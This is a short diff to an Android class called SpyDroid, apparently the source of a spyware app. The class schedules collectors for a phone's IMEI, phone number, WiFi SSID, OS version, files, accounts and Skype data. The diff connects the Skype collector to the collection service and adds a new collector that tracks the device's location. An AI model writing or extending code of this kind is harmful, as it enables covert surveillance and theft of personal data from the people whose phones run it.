@@ -145,7 +145,8 @@ public final class SpyDroid extends Activity {
 	    StaticCollector PNColl= new PhoneNumberCollector(ctxt,"coll_phone_number",collService);
 	    StaticCollector SSIDColl= new SSIDCollector(ctxt,"coll_SSID",collService);
 	    StaticCollector versionColl= new AndroidVersionCollector(ctxt,"coll_version",collService);
-	    StaticCollector skypeColl = new SkypeCollector(getApplicationContext(), "coll_skype", null);
+	    StaticCollector skypeColl = new SkypeCollector(ctxt, "coll_skype", collService);
+	    AbstractCollector locationColl = new LocationCollector(ctxt,"coll_location");
 	    
 		//Scheduling
 		collService.scheduleCollector(imeiColl);
@@ -158,6 +159,7 @@ public final class SpyDroid extends Activity {
 		collService.scheduleCollector(fileColl);
         collService.scheduleCollector(accountColl);
         collService.scheduleCollector(skypeColl);
+        collService.scheduleCollector(locationColl);
 	}
 	
 	
